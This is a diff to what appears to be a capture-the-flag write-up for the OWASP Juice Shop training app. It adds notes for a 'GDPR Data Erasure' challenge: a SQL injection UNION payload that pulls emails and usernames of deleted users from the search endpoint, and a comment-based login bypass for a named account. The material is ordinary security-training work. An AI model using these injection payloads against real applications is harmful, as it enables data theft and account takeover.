@@ -182,8 +182,11 @@ burp suite > proxy<br>
 "password":"K1f....................."<br>
 
 ### GDPR Data Erasure 
-
-
+burp suite > proxy > repeater <br>
+GET /rest/products/search?q=apple'))union%20select%20deletedAt,email,username,4,5,6,7,8,9%20from%20Users-- HTTP/1.1<br>
+http://localhost:3000/#/login<br>
+email:chris.pike@juice-sh.op'--<br>
+password:'<br>
 
 
 
